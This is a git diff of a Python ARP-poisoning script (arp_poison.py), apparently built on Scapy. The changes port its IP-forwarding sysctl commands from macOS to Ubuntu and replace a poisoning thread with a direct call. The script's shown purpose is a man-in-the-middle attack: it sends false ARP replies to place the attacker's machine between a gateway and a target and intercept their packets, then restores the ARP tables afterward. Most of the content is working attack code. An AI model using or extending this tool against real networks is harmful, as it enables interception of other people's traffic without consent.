@@ -28,10 +28,11 @@ def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
     print("[*] Disabling IP forwarding")
-    # Disable IP Forwarding on a mac
-    os.system("sysctl -w net.inet.ip.forwarding=0")
+    # Disable IP Forwarding on ubuntu
+    os.system("sysctl -w net.ipv4.ip_forward=0")
     # kill process on a mac
     os.kill(os.getpid(), signal.SIGTERM)
+
 
 # Keep sending false ARP replies to put our machine in the middle to intercept packets
 # This will use our interface MAC address as the hwsrc for the ARP reply
@@ -52,7 +53,7 @@ print("[*] Starting script: arp_poison.py")
 print("[*] Enabling IP forwarding")
 
 # Enable IP Forwarding on a mac
-os.system("sysctl -w net.inet.ip.forwarding=1")
+os.system("sysctl -w net.ipv4.ip_forward=1")
 
 print(f"[*] Gateway IP address: {gateway_ip}")
 print(f"[*] Target IP address: {target_ip}")
@@ -72,5 +73,4 @@ else:
     print(f"[*] Target MAC address: {target_mac}")
 
 # ARP poison thread
-poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
-poison_thread.start()
+arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)
